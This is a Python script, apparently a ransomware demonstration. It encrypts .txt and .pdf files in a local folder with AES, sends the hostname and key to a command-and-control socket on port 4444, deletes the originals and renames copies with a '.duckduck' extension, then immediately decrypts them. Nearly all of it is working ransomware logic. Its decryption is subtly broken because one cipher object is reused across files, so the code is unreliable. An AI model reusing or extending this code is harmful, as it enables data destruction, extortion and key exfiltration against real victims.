from datetime import datetime
from fileinput import filename
import os
import socket
from threading import Thread
from queue import Queue
import pyaes

# Select files on folder "files"
encrypted_ext = (".txt", ".pdf")

file_paths = []
for root, dirs, files in os.walk("./files"):
    for file in files:
        file_path, file_ext = os.path.splitext(root+"/"+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+"/"+file)

# Generate Key

key = "This_key_for_demo_purposes_only!".encode()
aes = pyaes.AESModeOfOperationCTR(key)

# Get OS informations
hostname = os.uname()[1]

# Connect to Comand Control Server
ip_address = "127.0.0.1"
port = 4444
timestamp = datetime.now()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_address, port))
    s.send(f"[{timestamp}] - {hostname}:{key}\n".encode("utf-8"))

# Encrypt files
def encrypt(filename, key):

    try:
        file_original = open(filename, "rb")
        file_data = file_original.read()
        crypto_data = aes.encrypt(file_data)
        file_original_name = os.path.basename(filename)
        new_file_substitute_name = "./files/" + file_original_name + ".duckduck"
        new_file_substitute = open(new_file_substitute_name, "wb")
        new_file_substitute.write(crypto_data)
        new_file_substitute.close()

        print("[+] Encrypted: " + filename)

        os.remove(filename)

        decrypt(new_file_substitute_name, key)

    except:
        print("[X] Failed to encrypt: " + filename)


# Decrypt function
def decrypt(filename, key):
    filename_original = open(filename, "rb")
    crypto_data = filename_original.read()
    aes = pyaes.AESModeOfOperationCTR(key)
    decrypted_data = aes.decrypt(crypto_data)
    original_file_name = os.path.splitext(filename)
    original_file = open(original_file_name[0], "wb")
    original_file.write(decrypted_data)

    os.remove(filename)

# Threading encryptation
for f in file_paths:
    encrypt(f, key)
